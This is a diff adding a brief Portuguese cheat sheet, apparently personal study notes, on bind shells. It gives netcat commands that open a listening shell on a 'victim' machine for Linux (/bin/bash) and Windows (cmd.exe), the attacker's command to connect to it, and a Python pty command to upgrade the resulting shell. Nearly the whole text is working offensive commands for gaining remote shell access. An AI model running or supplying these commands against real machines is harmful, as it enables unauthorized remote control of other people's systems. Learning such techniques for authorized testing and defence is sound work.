@@ -1,0 +1,21 @@
+O BIND SHELL É SIMPLESMENTE VOCÊ ABRIR UMA PORTA NA VITIMA E SE CONECTAR COM ELA.
+	
+	1.ABRIR A PORTA NA VITIMA.	
+		
+		LINUX: nc -lvp 220 -e /bin/bash
+		
+		WINDOWS: nc -lvp 220 -e cmd.exe
+		
+	2.SE CONECTAR USANDO A SUA MAQUINA ATACANTE.
+		
+		nc -nv ip_alvo porta_aberta
+		
+		EX: nc -nv 192.168.2.1 220
+			
+			
+	
+	UMA FORMA DE FAZER A SHELL LINUX APARENTAR DE FORMA MELHOR AO OBTE-LA 
+	PELO NETCAT SERIA USANDO O COMANDO:
+			
+			python3 -c "import pty;pty.spawn('/bin/bash')"
+		
